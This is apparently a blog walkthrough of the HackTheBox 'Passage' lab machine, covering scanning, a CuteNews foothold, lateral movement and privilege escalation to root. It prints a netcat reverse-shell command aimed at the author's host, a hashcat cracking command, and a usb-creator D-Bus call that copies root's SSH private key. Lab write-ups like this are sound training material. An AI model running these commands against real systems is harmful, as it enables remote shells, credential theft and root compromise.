---
layout: single
title:  Passage HackTheBox Walkthrough
date: 2022-7-25
classes: wide
header:
  teaser: 
tags:
  - HackTheBox
  - ctf
  - Linux
--- 

This box was made by my buddy @ChefByzen on Twitter, I know him from our Uni CTF team. Very cool box!

Let's get into it.
I started off by enumerating like usual with NMAP
```
# Nmap 7.80 scan initiated Sat Sep 26 16:38:13 2020 as: nmap -sCV -p- -vvv -A -T4 -oA passage 10.10.10.206
Nmap scan report for 10.10.10.206
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVnCUEEK8NK4naCBGc9im6v6c67d5w/z/i72QIXW9JPJ6bv/rdc45FOdiOSovmWW6onhKbdUje+8NKX1LvHIiotFhc66Jih+AW8aeK6pIsywDxtoUwBcKcaPkVFIiFUZ3UWOsWMi+qYTFGg2DEi3OHHWSMSPzVTh+YIsCzkRCHwcecTBNipHK645LwdaBLESJBUieIwuIh8icoESGaNcirD/DkJjjQ3xKSc4nbMnD7D6C1tIgF9TGZadvQNqMgSmJJRFk/hVeA/PReo4Z+WrWTvPuFiTFr8RW+yY/nHWrG6LfldCUwpz0jj/kDFGUDYHLBEN7nsFZx4boP8+p52D8F
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCdB2wKcMmurynbHuHifOk3OGwNcZ1/7kTJM67u+Cm/6np9tRhyFrjnhcsmydEtLwGiiY5+tUjr2qeTLsrgvzsY=
|   256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGRIhMr/zUartoStYphvYD6kVzr7TDo+gIQfS2WwhSBd
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Not much is open so I decided to check out the site
Immediately I see that they have fail2ban and another user kim switft

```
**Implemented Fail2Ban**
18 Jun 2020 By admin 0 Comments
Due to unusally large amounts of traffic, View & Comment
Phasellus tristique urna
12 Jun 2020 By Kim Swift 0 Comments
Sed felis pharetra, nec sodales diam sagittis. View & Comment 
```

So gobuster is out of the question to enumerate directories.
I set out to investigate the site manually by playing around and I saw that it is powered by cutenews
After searching around I came across two exploits for it. 
One was metasploit and the other someone had written a python script for after the box was released.
The author of the box says that the intended route is with metasploit.

In either case you get a shell as www-data, we can't get the flag just yet. We have to escalate privileges to get the user flag. 

![](/assets/images/PassageHTB/cutenews.png)

First order of business was making this a reverse shell cause I can't stand that default shell.
I ran nc -lnvp 9827 on my host kali machine and nc 10.10.**.** 9827 -e /bin/bash on the passage box

--------------------------

PRO TIP: RUN THESE FOR AN ENJOYABLE EXPERIENCE IN YOUR SHELL
```
python -c 'import pty;pty.spawn("/bin/bash");'
```
then
```
[CTRL-Z]
stty raw -echo;fg
[ENTER][ENTER]

source /etc/skel/.bashrc 
export TERM=screen-256color
```
END OF PRO TIP 

--------------------

At this point I got lost, that was until until I dig deeper and found /var/www/html/CuteNews/cdata.
In this directory I fell into a rabbithole of writing a python script to base64 decode the hashes inside of these many files
![](/assets/images/PassageHTB/base64.png)

For example, inside of one of those php files 
![](/assets/images/PassageHTB/1stphp.png)
has the first line as garbage and the second line being a base64 string. 
This script turned out to be for naught as the actual way to escalate privileges can be found inside the **Lines** file. 
![](/assets/images/PassageHTB/lines.png)
if you go through and decode them you come across one that says paul@passage.htb which is one of the two users I found when I was enumerating the home directory
![](/assets/images/PassageHTB/homedir.png)

Then we throw that hash we found into a hash analyzer and realize it's sha-256, well we could give it a shot cracking that hash to get his password.
![](/assets/images/PassageHTB/analyzer.png)

We could easily enough crack it with hashcat but this online service did it in less than a second.
![](/assets/images/PassageHTB/hashcrack.png)
If you want to take a more manual approach with hashcat yourself you could do it with 
```
hashcat -m 1400 paul.txt /usr/share/wordlists/rockyou.txt
```
at any rate you get atlanta1 as the password for paul
I enumerated as paul for a while until I eventually went into the .ssh dir and cated it all out,
I saw that nadav was in the authorized keys so while logged into paul I SSHd into nadav. 
![](/assets/images/PassageHTB/sshNadav.png)

Now out of all the privilege escalation i did for this box going from nadav to root was by far the hardest.
I always start out running a script that gives me a quick overview of the entire box very easily in case there's something i can spot out of place. In this case it didn't help all too much and I was left to exploring on my own

fail2ban, zeitgeist, and CUPS were the first processes that I investigated but I didn't come to any solution. I finally stumbled upon

```
/usr/bin/python3 /usr/share/usb-creator/usb-creator-helper
```
While looking at all the running processes. 
I don't remember having seen this before so I googled it and came across this article 
https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
They describe how to exploit this to copy files to other 
```
gdbus call --system --dest com.ubuntu.USBCREATOR --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true
```
This copies the root rsa key to /tmp/pwn on my box. 
then we 
```
chmod 600 root_id_rsa 
ssh -i root_id_rsa root@10.10.10.206
```
And you can access root.txt
Thanks for reading!

